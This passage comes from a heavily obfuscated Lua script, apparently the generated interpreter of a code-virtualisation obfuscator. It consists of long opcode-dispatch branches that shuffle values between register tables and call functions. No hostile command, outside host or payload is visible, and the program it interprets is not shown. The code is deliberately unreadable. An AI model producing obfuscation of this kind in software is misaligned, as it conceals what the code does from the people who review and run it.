n=y[63];end;elseif 185>z then if(y[94]<=w[y[758]])then n=n+1;else n=y[63];end;else w[y[94]]=w[y[63]][w[y[758]]];end;elseif z<=278 then if 231>=z then if z<=208 then if 196>=z then if 190>=z then if 187>=z then if 187~=z then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=false;n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];for x=y[94],y[63],1 do w[x]=nil;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];q=y[94]w[q]=w[q](w[q+1])else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif z<=188 then local q=y[94]local x={w[q](r(w,q+1,p))};local ba=0;for bb=q,y[758]do ba=ba+1;w[bb]=x[ba];end elseif z~=190 then if not w[y[94]]then n=n+1;else n=y[63];end;else local q;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif 193>=z then if 191>=z then local q,x=0 while true do if q<=10 then if q<=4 then if q<=1 then if q<1 then x=nil else w[y[94]]=w[y[63]][y[758]];end else if q<=2 then n=n+1;else if 4~=q then y=f[n];else w[y[94]]=j[y[63]];end end end else if q<=7 then if q<=5 then n=n+1;else if 7~=q then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end else if q<=8 then n=n+1;else if 10>q then y=f[n];else w[y[94]]=y[63];end end end end else if q<=15 then if q<=12 then if 11==q then n=n+1;else y=f[n];end else if q<=13 then w[y[94]]=y[63];else if 15>q then n=n+1;else y=f[n];end end end else if q<=18 then if q<=16 then w[y[94]]=y[63];else if q<18 then n=n+1;else y=f[n];end end else if q<=19 then x=y[94]else if 20==q then w[x]=w[x](r(w,x+1,y[63]))else break end end end end end q=q+1 end elseif 192==z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif 194>=z then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end elseif 196~=z then local q=y[94]w[q]=w[q]()else w[y[94]]=w[y[63]]*y[758];end;elseif z<=202 then if z<=199 then if 197>=z then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba=nil end else if q<=2 then bb=nil else if 3<q then n=n+1;else w[y[94]]=h[y[63]];end end end else if q<=6 then if q==5 then y=f[n];else w[y[94]]=h[y[63]];end else if q<=7 then n=n+1;else if 9~=q then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if q<=14 then if q<=11 then if 11>q then n=n+1;else y=f[n];end else if q<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if 13<q then y=f[n];else n=n+1;end end end else if q<=16 then if q>15 then ba={w[bb](w[bb+1])};else bb=y[94]end else if q<=17 then x=0;else if q<19 then for bc=bb,y[758]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end elseif 199~=z then do return end;else w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if(w[y[94]]~=w[y[758]])then n=n+1;else n=y[63];end;end;elseif 200>=z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif 202~=z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=false;n=n+1;y=f[n];q=y[94]w[q](w[q+1])else w[y[94]]=w[y[63]];end;elseif z<=205 then if z<=203 then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end elseif 204==z then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[63];x=y[758];q=k(w,g,ba,x);w[y[94]]=q;else local q=y[94]local x={}for ba=1,#v do local bb=v[ba]for bc=1,#bb do local bb=bb[bc]local bc,bc=bb[1],bb[2]if bc>=q then x[bc]=w[bc]bb[1]=x v[ba]=nil;end end end end;elseif z<=206 then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end elseif 207==z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q]()else local q;w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q]()end;elseif 219>=z then if 213>=z then if z<=210 then if z>209 then local q=y[94]w[q](w[q+1])else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif z<=211 then local q;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif z>212 then w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if(w[y[94]]~=w[y[758]])then n=n+1;else n=y[63];end;else if(w[y[94]]<=w[y[758]])then n=n+1;else n=y[63];end;end;elseif 216>=z then if z<=214 then w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;elseif 215==z then local q;w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif 217>=z then local q;w[y[94]]=w[y[63]]%w[y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]]+y[758];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif z~=219 then local q;w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif 225>=z then if z<=222 then if z<=220 then local q=0 while true do if q<=14 then if q<=6 then if q<=2 then if q<=0 then w={};else if q==1 then for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;else n=n+1;end end else if q<=4 then if q==3 then y=f[n];else w[y[94]]=h[y[63]];end else if q==5 then n=n+1;else y=f[n];end end end else if q<=10 then if q<=8 then if q<8 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if 10>q then y=f[n];else w[y[94]]=h[y[63]];end end else if q<=12 then if q<12 then n=n+1;else y=f[n];end else if 13<q then n=n+1;else w[y[94]]={};end end end end else if q<=21 then if q<=17 then if q<=15 then y=f[n];else if q==16 then w[y[94]]={};else n=n+1;end end else if q<=19 then if 19>q then y=f[n];else w[y[94]][y[63]]=w[y[758]];end else if q==20 then n=n+1;else y=f[n];end end end else if q<=25 then if q<=23 then if q~=23 then w[y[94]]=j[y[63]];else n=n+1;end else if q>24 then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end else if q<=27 then if q>26 then y=f[n];else n=n+1;end else if q>28 then break else if w[y[94]]then n=n+1;else n=y[63];end;end end end end end q=q+1 end elseif 221==z then w[y[94]][y[63]]=w[y[758]];else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif 223>=z then local q=d[y[63]];local x={};local ba={};for bb=1,y[758]do n=(n+1);local bc=f[n];if not(bc[680]~=12)then ba[bb-1]={w,bc[63],nil,nil};else ba[bb-1]={h,bc[63],nil,nil};end;v[(#v+1)]=ba;end;m(x,{['\95\95\105\110\100\101\120']=function(bb,bb)local bb=ba[bb];return bb[1][bb[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bb,bb,bc)local ba=ba[bb]ba[1][ba[2]]=bc;end;});w[y[94]]=b(q,x,j);elseif 224==z then local q=y[94]local x,ba=i(w[q](r(w,q+1,y[63])))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;else local q;w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif 228>=z then if(z<=226)then local q,x=0 while true do if q<=8 then if(q==3 or q<3)then if(q==1 or q<1)then if 0<q then w[y[94]]=w[y[63]][y[758]];else x=nil end else if not(q~=2)then n=(n+1);else y=f[n];end end else if(q<=5)then if not(5==q)then w[y[94]]=h[y[63]];else n=n+1;end else if(q==6 or q<6)then y=f[n];else if not(8==q)then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if(q<13 or q==13)then if(q<=10)then if not(10==q)then y=f[n];else w[y[94]]=y[63];end else if q<=11 then n=(n+1);else if q<13 then y=f[n];else w[y[94]]=y[63];end end end else if q<=15 then if q~=15 then n=n+1;else y=f[n];end else if(q<=16)then x=y[94]else if q==17 then w[x]=w[x](r(w,x+1,y[63]))else break end end end end end q=q+1 end elseif 227<z then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q~=1 then x=nil else w[y[94]]=h[y[63]];end else if 2==q then n=n+1;else y=f[n];end end else if q<=5 then if 5~=q then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if q>6 then w[y[94]]=y[63];else y=f[n];end end end else if q<=11 then if q<=9 then if 8<q then y=f[n];else n=n+1;end else if q>10 then n=n+1;else w[y[94]]=y[63];end end else if q<=13 then if q<13 then y=f[n];else x=y[94]end else if q~=15 then w[x]=w[x](r(w,x+1,y[63]))else break end end end end q=q+1 end else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q<1 then x=nil else w[y[94]][y[63]]=w[y[758]];end else if 3~=q then n=n+1;else y=f[n];end end else if q<=5 then if q==4 then w[y[94]]={};else n=n+1;end else if 6<q then w[y[94]][y[63]]=y[758];else y=f[n];end end end else if q<=11 then if q<=9 then if q~=9 then n=n+1;else y=f[n];end else if 10==q then w[y[94]][y[63]]=w[y[758]];else n=n+1;end end else if q<=13 then if q~=13 then y=f[n];else x=y[94]end else if q~=15 then w[x]=w[x](r(w,x+1,y[63]))else break end end end end q=q+1 end end;elseif z<=229 then for q=y[94],y[63],1 do w[q]=nil;end;elseif 230==z then j[y[63]]=w[y[94]];else local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];q=y[94]w[q](w[q+1])end;elseif 254>=z then if z<=242 then if z<=236 then if 233>=z then if z~=233 then local q;w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q]()else local q=y[63];local x=y[758];local q=k(w,g,q,x);w[y[94]]=q;end;elseif z<=234 then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end elseif 235<z then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]]+y[758];n=n+1;y=f[n];h[y[63]]=w[y[94]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif z<=239 then if 237>=z then w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;elseif 239~=z then local q;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](w[q+1])else w[y[94]]=w[y[63]][y[758]];end;elseif 240>=z then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[63];x=y[758];q=k(w,g,ba,x);w[y[94]]=q;elseif 242>z then local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[63];x=y[758];q=k(w,g,ba,x);w[y[94]]=q;else local q=w[y[758]];if q then n=n+1;else w[y[94]]=q;n=y[63];end;end;elseif z<=248 then if z<=245 then if 243>=z then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if 1~=q then x=nil else w[y[94]]=w[y[63]][y[758]];end else if q<3 then n=n+1;else y=f[n];end end else if q<=5 then if 4==q then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if q<=6 then y=f[n];else if 8~=q then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if q<=13 then if q<=10 then if q>9 then w[y[94]]=w[y[63]][y[758]];else y=f[n];end else if q<=11 then n=n+1;else if q~=13 then y=f[n];else w[y[94]]=false;end end end else if q<=15 then if 14==q then n=n+1;else y=f[n];end else if q<=16 then x=y[94]else if q<18 then w[x](w[x+1])else break end end end end end q=q+1 end elseif 244==z then w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if not w[y[94]]then n=n+1;else n=y[63];end;else local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94];do return w[q](r(w,q+1,y[63]))end;n=n+1;y=f[n];q=y[94];do return r(w,q,p)end;end;elseif z<=246 then w[y[94]]=(y[63]*w[y[758]]);elseif 248>z then local q=y[94]local x={w[q](r(w,q+1,p))};local ba=0;for bb=q,y[758]do ba=ba+1;w[bb]=x[ba];end else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif 251>=z then if z<=249 then w[y[94]]=w[y[63]]-y[758];elseif z>250 then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]]*y[758];n=n+1;y=f[n];w[y[94]]=w[y[63]]+w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]]+w[y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif z<=252 then if(y[94]<w[y[758]])then n=n+1;else n=y[63];end;elseif z>253 then w[y[94]]=w[y[63]]-w[y[758]];else if(w[y[94]]~=w[y[758]])then n=n+1;else n=y[63];end;end;elseif z<=266 then if 260>=z then if 257>=z then if 255>=z then a(c,e);elseif 257~=z then local a;local c;w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]={r({},1,y[63])};n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];c=y[94];a=w[c];for e=c+1,y[63]do t(a,w[e])end;else local a;local c;local e;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];e=y[94]c={w[e](w[e+1])};a=0;for q=e,y[758]do a=a+1;w[q]=c[a];end end;elseif 258>=z then if(w[y[94]]~=y[758])then n=y[63];else n=n+1;end;elseif 259<z then local a=y[94]local c={w[a](w[a+1])};local e=0;for q=a,y[758]do e=e+1;w[q]=c[e];end else w[y[94]]=w[y[63]]+w[y[758]];end;elseif 263>=z then if 261>=z then local a;local c;local e;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];e=y[94]c={w[e](w[e+1])};a=0;for q=e,y[758]do a=a+1;w[q]=c[a];end elseif z>262 then if(w[y[94]]~=w[y[758]])then n=y[63];else n=n+1;end;else local a;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];a=y[94]w[a]=w[a](w[a+1])end;elseif 264>=z then h[y[63]]=w[y[94]];elseif 266>z then local a=y[94]local c={}for e=1,#v do local q=v[e]for x=1,#q do local q=q[x]local x,x=q[1],q[2]if x>=a then c[x]=w[x]q[1]=c v[e]=nil;end end end else w[y[94]]=w[y[63]]+y[758];end;elseif z<=272 then if z<=269 then if 267>=z then local a;local c;w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]={r({},1,y[63])};n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];c=y[94];a=w[c];for e=c+1,y[63]do t(a,w[e])end;elseif z<269 then local a=y[94];local c=w[y[63]];w[a+1]=c;w[a]=c[y[758]];else w[y[94]]();end;elseif z<=270 then local a;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];a=y[94]w[a]=w[a]()elseif z<272 then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];if(w[y[94]]~=y[758])then n=n+1;else n=y[63];end;else local a;w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];a=y[94]w[a]=w[a]()end;elseif 275>=z then if 273>=z then w[y[94]]=false;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];if(w[y[94]]~=y[758])then n=n+1;else n=y[63];end;elseif z>274 then local a=y[94];local c=w[y[63]];w[a+1]=c;w[a]=c[y[758]];else local a;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];a=y[94]w[a]=w[a](r(w,a+1,y[63]))end;elseif 276>=z then local 